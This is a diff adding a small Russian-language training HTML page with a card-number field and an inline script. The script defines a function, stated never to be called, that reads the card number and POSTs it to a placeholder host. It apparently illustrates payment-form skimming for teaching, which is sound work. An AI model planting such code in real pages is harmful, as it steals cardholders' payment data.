@@ -1,0 +1,6 @@
+<!doctype html><html lang="ru"><meta charset="utf-8"><title>Учебный встроенный JS</title><body style="font:18px system-ui;padding:2rem"><h1>Учебная форма и встроенный скрипт</h1><p>Это безопасный пример: функция ниже не вызывается, сеть не используется. Не вводите настоящие данные.</p><label>Номер карты <input autocomplete="cc-number" placeholder="номер карты"></label><script>
+function fictionalExampleNeverCalled() {
+  const value = document.querySelector('[autocomplete="cc-number"]').value;
+  fetch('https://example.invalid/never-called', { method: 'POST', body: value });
+}
+</script><p><a href="/">В лабораторию</a></p></body></html>
